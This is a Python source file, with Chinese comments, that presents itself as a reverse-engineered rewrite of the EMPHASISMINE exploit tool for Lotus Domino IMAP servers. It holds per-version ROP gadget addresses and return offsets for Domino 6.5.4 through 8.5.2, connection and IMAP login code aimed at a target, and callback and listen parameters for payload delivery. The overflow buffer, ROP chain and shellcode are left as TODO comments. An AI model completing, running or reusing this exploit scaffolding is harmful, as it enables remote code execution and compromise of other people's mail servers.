"""emphasis_mine — EMPHASISMINE Lotus Domino IMAP 利用核心逻辑。

Python 重写的 `Emphasismine-3.4.0.exe` (C++ / DAVE framework)。
通过 IDA Pro / x32dbg 逆向恢复。实现了该工具的 key=value 参数接口
及其 Lotus Domino IMAP 利用流程。

参数定义来源：Emphasismine-3.4.0.0.xml
"""

import socket
import struct
import sys

# ---------------------------------------------------------------------------
# 常量（来自 XML config 的 <inputparameters>）
# ---------------------------------------------------------------------------

DEFAULT_PORT = 143
DEFAULT_TIMEOUT = 60

# 每个 Lotus Domino 版本的 ROP gadget 地址（来自 XML <DominoVersion><paramgroup>）
DOMINO_VERSION_GADGETS = {
    "6.5.4": {
        "ReturnAddrOffset": 0x34C,
        "AddrPopEax": 0x00428463,
        "AddrVirtualAlloc": 0x0042E038,
        "AddrJmpEaxPtr": 0x00420CF5,
        "AddrPopEdi": 0x60132252,
        "AddrEaxToEsi": 0x60951039,
        "AddrCopyCode": 0x607112B4,
        "AddrIncEax": 0x60168187,
        "AddrJmpEax": 0x600A371D,
        "AddrSetAtEdxRet": 0x609DBEA1,
        "AddrClrEaxRet": 0x0042845E,
        "RetEip": 0x0041331B,
    },
    "6.5.5": {
        "ReturnAddrOffset": 0x34C,
        "AddrPopEax": 0x004283D3,
        "AddrVirtualAlloc": 0x0042E038,
        "AddrJmpEaxPtr": 0x00420C15,
        "AddrPopEdi": 0x00427989,
        "AddrEaxToEsi": 0x60984BC9,
        "AddrCopyCode": 0x60740B94,
        "AddrIncEax": 0x60169917,
        "AddrJmpEax": 0x6016B89E,
        "AddrSetAtEdxRet": 0x60A0FCB1,
        "AddrClrEaxRet": 0x004283CE,
        "RetEip": 0x0041323B,
    },
    "6.5.5FP1": {
        "ReturnAddrOffset": 0x34C,
        "AddrPopEax": 0x004283D3,
        "AddrVirtualAlloc": 0x0042E038,
        "AddrJmpEaxPtr": 0x00420C15,
        "AddrPopEdi": 0x00427989,
        "AddrEaxToEsi": 0x60985499,
        "AddrCopyCode": 0x60741404,
        "AddrIncEax": 0x6099F0D7,
        "AddrJmpEax": 0x6003620D,
        "AddrSetAtEdxRet": 0x60A108A1,
        "AddrClrEaxRet": 0x004283CE,
        "RetEip": 0x0041323B,
    },
    "7.0": {
        "ReturnAddrOffset": 0x22C,
        "AddrPopEax": 0x0042a001,
        "AddrVirtualAlloc": 0x0043305c,
        "AddrJmpEaxPtr": 0x0041d5a7,
        "AddrPopEdi": 0x0042cbec,
        "AddrEaxToEsi": 0x100aa91d,
        "AddrCopyCode": 0x606f6ee4,
        "AddrIncEax": 0x600fa694,
        "AddrJmpEax": 0x00429a6c,
        "AddrSetAtEdxRet": 0x004050A7,
        "AddrClrEaxRet": 0x004050AF,
        "RetEip": 0x00413E78,
    },
    "7.0.1": {
        "ReturnAddrOffset": 0x22C,
        "AddrPopEax": 0x0042Af00,
        "AddrVirtualAlloc": 0x0043305C,
        "AddrJmpEaxPtr": 0x0041D5A7,
        "AddrPopEdi": 0x0042CBEC,
        "AddrEaxToEsi": 0x100AA91D,
        "AddrCopyCode": 0x606F9364,
        "AddrIncEax": 0x600FA6D4,
        "AddrJmpEax": 0x00429A6C,
        "AddrSetAtEdxRet": 0x004050A7,
        "AddrClrEaxRet": 0x004050AF,
        "RetEip": 0x00413E78,
    },
    "7.0.2": {
        "ReturnAddrOffset": 0x22C,
        "AddrPopEax": 0x0042A001,
        "AddrVirtualAlloc": 0x0043305C,
        "AddrJmpEaxPtr": 0x0041D5A7,
        "AddrPopEdi": 0x0042CB58,
        "AddrEaxToEsi": 0x100AAADD,
        "AddrCopyCode": 0x60709A24,
        "AddrIncEax": 0x600F8E54,
        "AddrJmpEax": 0x00429A6C,
        "AddrSetAtEdxRet": 0x004050A7,
        "AddrClrEaxRet": 0x6001FAC1,
        "RetEip": 0x00413E78,
    },
    "7.0.3": {
        "ReturnAddrOffset": 0x22C,
        "AddrPopEax": 0x0042A091,
        "AddrVirtualAlloc": 0x0043305C,
        "AddrJmpEaxPtr": 0x0041D637,
        "AddrPopEdi": 0x0042CBE8,
        "AddrEaxToEsi": 0x100AA9ED,
        "AddrCopyCode": 0x6071E614,
        "AddrIncEax": 0x600F87E4,
        "AddrJmpEax": 0x00429AFC,
        "AddrSetAtEdxRet": 0x004050B7,
        "AddrClrEaxRet": 0x004050BF,
        "RetEip": 0x00413F08,
    },
    "7.0.3FP1": {
        "ReturnAddrOffset": 0x22C,
        "AddrPopEax": 0x0042A091,
        "AddrVirtualAlloc": 0x0043305C,
        "AddrJmpEaxPtr": 0x0041D637,
        "AddrPopEdi": 0x0042CBE8,
        "AddrEaxToEsi": 0x100AA9ED,
        "AddrCopyCode": 0x6071e674,
        "AddrIncEax": 0x600f8824,
        "AddrJmpEax": 0x00429AFC,
        "AddrSetAtEdxRet": 0x004050B7,
        "AddrClrEaxRet": 0x004050BF,
        "RetEip": 0x00413F08,
    },
    "7.0.4": {
        "ReturnAddrOffset": 0x22C,
        "AddrPopEax": 0x0042A271,
        "AddrVirtualAlloc": 0x0043305C,
        "AddrJmpEaxPtr": 0x0041d817,
        "AddrPopEdi": 0x0042cdde,
        "AddrEaxToEsi": 0x100a9e3d,
        "AddrCopyCode": 0x60728db4,
        "AddrIncEax": 0x60150da4,
        "AddrJmpEax": 0x00429cdc,
        "AddrSetAtEdxRet": 0x00405107,
        "AddrClrEaxRet": 0x0040510f,
        "RetEip": 0x00413f98,
    },
    "8.0": {
        "ReturnAddrOffset": 0x22C,
        "AddrPopEax": 0x00429fa1,
        "AddrVirtualAlloc": 0x0043205c,
        "AddrJmpEaxPtr": 0x0041d567,
        "AddrPopEdi": 0x0042caf8,
        "AddrEaxToEsi": 0x60aa7dab,
        "AddrCopyCode": 0x60764914,
        "AddrIncEax": 0x60153b14,
        "AddrJmpEax": 0x00429a12,
        "AddrSetAtEdxRet": 0x00405067,
        "AddrClrEaxRet": 0x0040506f,
        "RetEip": 0x00413cd8,
    },
    "8.0.1": {
        "ReturnAddrOffset": 0x22C,
        "AddrPopEax": 0x0042a001,
        "AddrVirtualAlloc": 0x0043205c,
        "AddrJmpEaxPtr": 0x0041d5c7,
        "AddrPopEdi": 0x0042cb58,
        "AddrEaxToEsi": 0x60abf84b,
        "AddrCopyCode": 0x60772714,
        "AddrIncEax": 0x601549d4,
        "AddrJmpEax": 0x00429a72,
        "AddrSetAtEdxRet": 0x004050b7,
        "AddrClrEaxRet": 0x004050bf,
        "RetEip": 0x00413d38,
    },
    "8.0.2": {
        "ReturnAddrOffset": 0x22C,
        "AddrPopEax": 0x0042a001,
        "AddrVirtualAlloc": 0x0043205c,
        "AddrJmpEaxPtr": 0x0041d5c7,
        "AddrPopEdi": 0x0042cb58,
        "AddrEaxToEsi": 0x60Ace7ab,
        "AddrCopyCode": 0x6077a774,
        "AddrIncEax": 0x600f9b04,
        "AddrJmpEax": 0x00429a72,
        "AddrSetAtEdxRet": 0x004050b7,
        "AddrClrEaxRet": 0x004050bf,
        "RetEip": 0x00413d38,
    },
    "8.5": {
        "ReturnAddrOffset": 0x22C,
        "AddrPopEax": 0x0042a361,
        "AddrVirtualAlloc": 0x0043305c,
        "AddrJmpEaxPtr": 0x0042d17a,
        "AddrPopEdi": 0x0042ceb8,
        "AddrEaxToEsi": 0x60b8de5b,
        "AddrCopyCode": 0x606068f8,
        "AddrIncEax": 0x600f37c4,
        "AddrJmpEax": 0x00429dd4,
        "AddrSetAtEdxRet": 0x004050b7,
        "AddrClrEaxRet": 0x004050bf,
        "RetEip": 0x00414068,
    },
    "8.5.1": {
        "ReturnAddrOffset": 0x22C,
        "AddrPopEax": 0x0042b5d0,
        "AddrVirtualAlloc": 0x0043305C,
        "AddrJmpEaxPtr": 0x0041db67,
        "AddrPopEdi": 0x0042d4a0,
        "AddrEaxToEsi": 0x620aa96d,
        "AddrCopyCode": 0x60630e48,
        "AddrIncEax": 0x6015db64,
        "AddrJmpEax": 0x42a146,
        "AddrSetAtEdxRet": 0x4050a7,
        "AddrClrEaxRet": 0x4050af,
        "RetEip": 0x4140c8,
    },
    "8.5.1FP1": {
        "ReturnAddrOffset": 0x22C,
        "AddrPopEax": 0x0042a831,
        "AddrVirtualAlloc": 0x0043305C,
        "AddrJmpEaxPtr": 0x0042e761,
        "AddrPopEdi": 0x0042d388,
        "AddrEaxToEsi": 0x620aa96d,
        "AddrCopyCode": 0x606311b8,
        "AddrIncEax": 0x6015dbd4,
        "AddrJmpEax": 0x0042a2a6,
        "AddrSetAtEdxRet": 0x004050a7,
        "AddrClrEaxRet": 0x004050af,
        "RetEip": 0x0041413c,
    },
    "8.5.1FP2": {
        "ReturnAddrOffset": 0x22C,
        "AddrPopEax": 0x0042a831,
        "AddrVirtualAlloc": 0x0043305C,
        "AddrJmpEaxPtr": 0x0042e761,
        "AddrPopEdi": 0x0042d388,
        "AddrEaxToEsi": 0x620aa96d,
        "AddrCopyCode": 0x60631f08,
        "AddrIncEax": 0x6015d2d4,
        "AddrJmpEax": 0x0042a2a6,
        "AddrSetAtEdxRet": 0x004050a7,
        "AddrClrEaxRet": 0x004050af,
        "RetEip": 0x0041413c,
    },
    "8.5.1FP3": {
        "ReturnAddrOffset": 0x22C,
        "AddrPopEax": 0x0042a831,
        "AddrVirtualAlloc": 0x0043305C,
        "AddrJmpEaxPtr": 0x0042e761,
        "AddrPopEdi": 0x0042d388,
        "AddrEaxToEsi": 0x620aa96d,
        "AddrCopyCode": 0x60631058,
        "AddrIncEax": 0x6015c0c4,
        "AddrJmpEax": 0x0042a2a6,
        "AddrSetAtEdxRet": 0x004050a7,
        "AddrClrEaxRet": 0x004050af,
        "RetEip": 0x0041413c,
    },
    "8.5.1FP4": {
        "ReturnAddrOffset": 0x22C,
        "AddrPopEax": 0x0042a7d1,
        "AddrVirtualAlloc": 0x0043305C,
        "AddrJmpEaxPtr": 0x0041dc67,
        "AddrPopEdi": 0x0042d328,
        "AddrEaxToEsi": 0x620aa96d,
        "AddrCopyCode": 0x60631328,
        "AddrIncEax": 0x6015c284,
        "AddrJmpEax": 0x0042a240,
        "AddrSetAtEdxRet": 0x004050a7,
        "AddrClrEaxRet": 0x004050af,
        "RetEip": 0x004140dc,
    },
    "8.5.1FP5": {
        "ReturnAddrOffset": 0x22C,
        "AddrPopEax": 0x0042a7d1,
        "AddrVirtualAlloc": 0x0043305C,
        "AddrJmpEaxPtr": 0x0041dc67,
        "AddrPopEdi": 0x0042d328,
        "AddrEaxToEsi": 0x620aa96d,
        "AddrCopyCode": 0x60631a78,
        "AddrIncEax": 0x6015c654,
        "AddrJmpEax": 0x0042a240,
        "AddrSetAtEdxRet": 0x004050a7,
        "AddrClrEaxRet": 0x004050af,
        "RetEip": 0x004140dc,
    },
    "8.5.2": {
        "ReturnAddrOffset": 0x22C,
        "AddrPopEax": 0x0042AA81,
        "AddrVirtualAlloc": 0x0043305C,
        "AddrJmpEaxPtr": 0x0041DF07,
        "AddrPopEdi": 0x0042D66C,
        "AddrEaxToEsi": 0x60DDE56B,
        "AddrCopyCode": 0x60692948,
        "AddrIncEax": 0x6014a394,
        "AddrJmpEax": 0x0042A4F2,
        "AddrSetAtEdxRet": 0x00405227,
        "AddrClrEaxRet": 0x0040522F,
        "RetEip": 0x004142AC,
    },
}

class EmphasisMineError(Exception):
    pass


def connect(target_ip, port, timeout):
    """建立到目标的 TCP 连接并返回 socket。"""
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(timeout if timeout > 0 else None)
    sock.connect((target_ip, port))
    return sock


def build_imap_login_request(username, password):
    """构建 IMAP 登录请求。"""
    tag = "A0001"
    request = f'{tag} LOGIN "{username}" "{password}"\r\n'
    return request.encode("utf-8")


def run_function(
    target,
    port=DEFAULT_PORT,
    timeout=DEFAULT_TIMEOUT,
    domino_version="8.5.2",
    target_acct_usr=None,
    target_acct_pwd=None,
    direction="Callback",
    callback_ip=None,
    callback_port=None,
    callback_local_port=None,
    listen_port=None,
    listen_local_port=None,
    listen_wait=10,
    verbose=False,
):
    """执行 EMPHASISMINE 利用序列。

    当前阶段：完成参数解析、IMAP 连接与登录。
    具体 exploit 缓冲区（IMAP 缓冲区溢出、ROP 链、shellcode、载荷投递等）
    的二进制结构尚需通过 capstone/x32dbg 进一步逆向后填充。
    """
    if verbose:
        print(f"[*] Target: {target}:{port}")
        print(f"[*] Timeout: {timeout}s")
        print(f"[*] Domino version: {domino_version}")
        print(f"[*] Direction: {direction}")
        if target_acct_usr:
            print(f"[*] Target account user: {target_acct_usr}")
        if callback_ip:
            print(f"[*] Callback IP: {callback_ip}")
        print(f"[*] Callback port: {callback_port}")

    # 解析常量
    gadgets = DOMINO_VERSION_GADGETS.get(domino_version, DOMINO_VERSION_GADGETS["8.5.2"])

    if verbose:
        print(f"[*] ReturnAddrOffset: 0x{gadgets['ReturnAddrOffset']:03X}")
        print(f"[*] AddrPopEax: 0x{gadgets['AddrPopEax']:08X}")
        print(f"[*] AddrJmpEax: 0x{gadgets['AddrJmpEax']:08X}")
        print(f"[*] AddrVirtualAlloc: 0x{gadgets['AddrVirtualAlloc']:08X}")
        print(f"[*] RetEip: 0x{gadgets['RetEip']:08X}")

    # 建立到目标的 TCP 连接（IMAP 143）
    try:
        sock = connect(target, port, timeout)
        if verbose:
            print(f"[+] Connected to {target}:{port}")
    except OSError as exc:
        raise EmphasisMineError(f"无法连接到 {target}:{port}: {exc}") from exc

    # 发送 IMAP 登录请求（探测阶段）
    if target_acct_usr and target_acct_pwd:
        login_request = build_imap_login_request(target_acct_usr, target_acct_pwd)
    else:
        login_request = b"A0001 LOGIN anonymous anonymous\r\n"
    try:
        sock.sendall(login_request)
        resp = sock.recv(4096)
    except OSError as exc:
        sock.close()
        raise EmphasisMineError(f"IMAP 登录失败: {exc}") from exc

    if verbose:
        print(f"[*] IMAP 应答: {resp[:128]}")

    sock.close()

    # TODO: 以下 exploit 缓冲区构建需通过 IDA/x32dbg 逆向后填充：
    #   - IMAP 缓冲区溢出（ReturnAddrOffset 相关）
    #   - ROP 链（AddrPopEax, AddrJmpEax, AddrVirtualAlloc, AddrJmpEaxPtr,
    #     AddrPopEdi, AddrEaxToEsi, AddrCopyCode, AddrIncEax,
    #     AddrSetAtEdxRet, AddrClrEaxRet, RetEip）
    #   - Shellcode 注入
    #   - 载荷投递（Callback/Callin）

    return 0


def main(argv=None):
    """CLI 入口（供 __main__ 子命令调用）。"""
    return 0
